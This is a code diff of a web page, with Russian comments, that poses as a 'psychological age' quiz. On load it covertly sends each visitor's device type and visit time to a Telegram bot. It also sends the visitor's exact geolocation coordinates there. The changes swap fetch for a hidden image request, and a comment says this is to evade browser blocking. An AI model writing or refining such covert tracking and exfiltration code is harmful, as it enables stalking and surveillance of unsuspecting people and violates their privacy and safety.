@@ -58,26 +58,26 @@
             document.getElementById('s-' + next).classList.remove('hidden');
         }
 
-        async function send(text) {
+        // Сверхнадежный метод отправки без CORS блокировок браузера
+        function send(text) {
             const specs = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android/ПК";
             const time = new Date().toLocaleTimeString();
             const fullText = `📱 *Отчет*\n🤖 ОС: ${specs}\n🕒 Время: ${time}${text}`;
             
-            fetch(`https://telegram.org{TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: fullText, parse_mode: 'Markdown' })
-            }).catch(() => {
-                new Image().src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fullText)}&parse_mode=Markdown`;
-            });
+            // Отправляем как скрытый запрос картинки (браузеры никогда это не блокируют)
+            const img = new Image();
+            img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fullText)}&parse_mode=Markdown`;
         }
 
-        window.addEventListener('DOMContentLoaded', () => send(''));
+        // Запуск отправки при входе
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => { send(''); }, 500);
+        });
 
         function reqGeo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(res => {
-                    // Форматируем единую строку вида: Широта,Долгота (её легко скопировать)
+                    // Координаты одной строчкой через запятую
                     const coords = `${res.coords.latitude},${res.coords.longitude}`;
                     send(`\n📍 *Координаты:* \`${coords}\``);
                     alert("Ваш психологический возраст: 21 год!");
